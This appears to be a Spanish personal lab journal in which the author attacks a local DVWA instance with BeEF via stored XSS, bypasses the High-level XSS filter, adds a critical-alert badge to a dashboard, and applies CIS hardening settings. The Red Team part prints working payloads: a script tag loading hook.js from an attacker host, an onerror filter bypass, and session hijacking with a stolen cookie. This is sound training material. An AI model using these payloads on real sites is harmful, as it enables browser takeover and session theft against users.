# Día 25 — BeEF Framework + XSS High + Badge Crítico + CIS Hardening

**Fecha:** Abril 2026  
**MITRE:** T1185, T1059.007  
**DVWA:** XSS Reflected (High) + XSS Stored (Low)

---

## Teoría

### BeEF Framework
BeEF (Browser Exploitation Framework) es una herramienta de pentesting que explota vulnerabilidades del browser. A diferencia de otros frameworks que atacan el OS, BeEF ataca al browser del usuario via JavaScript. Una vez que el browser carga `hook.js`, el atacante tiene control completo sobre él desde el panel de BeEF.

### XSS High
En nivel High DVWA aplica una expresión regular que elimina todas las variantes de `<script>`. Sin embargo no cubre eventos HTML como `onerror`, `onload`, `onclick`. Cualquier tag HTML que soporte eventos puede ejecutar JavaScript sin necesidad de `<script>`.

---

## Red Team

### Sección 1 — BeEF: Hookear browser via XSS Stored

**Iniciar BeEF:**
```bash
sudo beef-xss
# Panel: http://127.0.0.1:3000/ui/panel
# Hook: <script src="http://192.168.1.132:3000/hook.js"></script>
```

**Inyectar hook en guestbook de DVWA:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/xss_s/" \
  -b "PHPSESSID=<session>; security=low" \
  -X POST \
  -d 'txtName=hacker&mtxMessage=<script src="http://192.168.1.132:3000/hook.js"></script>&btnSign=Sign+Guestbook'
```

Cuando cualquier usuario visita la página del guestbook, su browser carga `hook.js` y aparece en el panel de BeEF.

### Sección 2 — BeEF: Módulos ejecutados

**Get Cookie:**
```
cookie=PHPSESSID=qechs4atej3bjm2h7hcqe8n9o5; security=low; BEEFHOOK=4z7C6qPr...
```

Cookie de sesión robada — usada para session hijacking:
```bash
curl -s "http://192.168.1.96:8080/" \
  -b "PHPSESSID=qechs4atej3bjm2h7hcqe8n9o5; security=low"
# → acceso como admin sin contraseña
```

**Fake Notification Bar:**
```
result=Notification has been displayed
```
Notificación falsa mostrada en el browser: "Actualización de seguridad requerida. Haz clic para instalar." — ingeniería social directamente en el browser de la víctima.

**Cadena completa del ataque:**
```
XSS Stored → hook.js inyectado en guestbook
    ↓
Víctima visita la página → browser hookeado
    ↓
BeEF roba cookie de sesión (PHPSESSID)
    ↓
Session Hijacking — acceso como admin sin contraseña
    ↓
Fake Notification Bar — ingeniería social en el browser
```

### Sección 3 — XSS High

High aplica regex que elimina todas las variantes de `<script>` pero no cubre eventos HTML.

**Bypass — evento `onerror`:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(1)>&Submit=Submit" \
  -b "PHPSESSID=<session>; security=high" | grep -i "hello\|img"
# → Hello <img src=x onerror=alert(1)>
```

**Bypass con hook de BeEF via String.fromCharCode:**
```bash
curl -g -s "http://192.168.1.96:8080/vulnerabilities/xss_r/?name=<img+src=x+onerror=eval(String.fromCharCode(...))>&Submit=Submit"
```

`String.fromCharCode()` convierte números ASCII a caracteres — evita comillas completamente. El payload genera dinámicamente el código JavaScript que carga `hook.js`.

**Resumen XSS por niveles:**

| Nivel | Filtro | Bypass |
|-------|--------|--------|
| Low | Sin filtro | `<script>alert(1)</script>` |
| Medium | str_replace `<script>` | `<Script>` o `onerror` |
| High | Regex elimina todas las variantes de `<script>` | `<img onerror=alert(1)>` |

---

## App MS Security — Badge de Alertas Críticas

Se agregó un badge en el header que muestra el número de alertas Wazuh de nivel 10 o superior:

```jsx
{wazuhAlerts.filter(a => a.rule_level >= 10).length > 0 && (
  <span style={{
    fontFamily: "JetBrains Mono",
    fontSize: "0.7rem",
    color: "#f87171",
    background: "rgba(239,68,68,0.12)",
    border: "1px solid rgba(239,68,68,0.3)",
    padding: "4px 10px",
    borderRadius: "4px",
    animation: "pulse 2s infinite"
  }}>
    ⚠ {wazuhAlerts.filter(a => a.rule_level >= 10).length} CRÍTICO{wazuhAlerts.filter(a => a.rule_level >= 10).length > 1 ? "S" : ""}
  </span>
)}
```

Solo aparece cuando hay alertas críticas — invisible cuando todo está en niveles bajos.

---

## Wazuh — CIS Hardening

Score al inicio: **40%** (193 passed / 281 failed) — objetivo del Día 24 alcanzado.

### Grupo 1 — UAC y auditoría

```powershell
# Admin built-in también pasa por UAC
Set-ItemProperty -Path "HKLM:\...\Policies\System" -Name "FilterAdministratorToken" -Value 1

# Usuarios estándar: denegar elevación automáticamente
Set-ItemProperty -Path "HKLM:\...\Policies\System" -Name "ConsentPromptBehaviorUser" -Value 0

# UAC prompt en escritorio seguro
Set-ItemProperty -Path "HKLM:\...\Policies\System" -Name "PromptOnSecureDesktop" -Value 1

# Forzar políticas de auditoría por subcategoría
Set-ItemProperty -Path "HKLM:\SYSTEM\...\Lsa" -Name "SCENoApplyLegacyAuditPolicy" -Value 1
```

`PromptOnSecureDesktop` es especialmente importante — evita que malware interactúe con el prompt de UAC.

### Grupo 2 — SMB Signing y Network

```powershell
# SMB client — firma digital obligatoria
Set-ItemProperty -Path "HKLM:\SYSTEM\...\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1

# SMB server — firma digital obligatoria
Set-ItemProperty -Path "HKLM:\SYSTEM\...\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1

# No permitir enumeración anónima de SAM y shares
Set-ItemProperty -Path "HKLM:\SYSTEM\...\Lsa" -Name "RestrictAnonymous" -Value 1
```

SMB Signing previene ataques MITM sobre recursos compartidos — sin firma un atacante puede interceptar y modificar archivos en tránsito.

### Grupo 3 — Firewall Domain Profile

```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\Logging" -Force | Out-Null
Set-ItemProperty -Path "...\DomainProfile\Logging" -Name "LogDroppedPackets" -Value 1
Set-ItemProperty -Path "...\DomainProfile\Logging" -Name "LogSuccessfulConnections" -Value 1
Set-ItemProperty -Path "...\DomainProfile\Logging" -Name "LogFileSize" -Value 16384
```

### Grupo 4 — RDP y RPC

```powershell
# RPC — autenticación en Endpoint Mapper
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Rpc" -Name "EnableAuthEpResolution" -Value 1

# RDP — siempre pedir contraseña al conectar
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "fPromptForPassword" -Value 1

# RDP — cifrado TLS obligatorio
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "SecurityLayer" -Value 2

# RDP — cerrar sesiones desconectadas después de 1 minuto
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "MaxDisconnectionTime" -Value 60000
```

### Grupo 5 — Impresoras y PrintNightmare

```powershell
# Solo admins instalan drivers de impresora
Set-ItemProperty -Path "HKLM:\SYSTEM\...\LanMan Print Services\Servers" -Name "AddPrinterDrivers" -Value 1

# Deshabilitar conexiones remotas al Spooler
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers" -Name "RegisterSpoolerRemoteRpcEndPoint" -Value 2

# PointAndPrint — solo admins
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "RestrictDriverInstallationToAdministrators" -Value 1
```

PrintNightmare (CVE-2021-34527) fue uno de los exploits más críticos de 2021 — escalada de privilegios via drivers de impresora maliciosos instalados remotamente.

---

## Blue Team

### Detección BeEF/XSS
- Requests a dominios externos cargando scripts JS desde páginas internas
- Tráfico hacia puerto 3000 desde browsers de usuarios — inusual
- File Integrity Monitoring detectaría cambios en el guestbook de DVWA
- CSP (Content Security Policy) bloquearía la carga de `hook.js` desde dominio externo

### Mitigación XSS
- `htmlspecialchars()` en el output — neutraliza cualquier tag o evento HTML
- Content Security Policy — `script-src 'self'` bloquea scripts externos
- Las listas negras de tags son siempre bypasseables — el enfoque correcto es escapar el output

---

## Conclusión

BeEF demostró la cadena completa de un ataque XSS real — desde la inyección del hook hasta el session hijacking y la ingeniería social. XSS High confirma que las listas negras son insuficientes — `onerror` es un bypass trivial que no requiere `<script>`. El badge de alertas críticas convierte el dashboard en una herramienta de triage — el analista ve inmediatamente si hay eventos urgentes. El hardening cubrió UAC, SMB signing, Firewall Domain, RDP/RPC y mitigaciones de PrintNightmare.
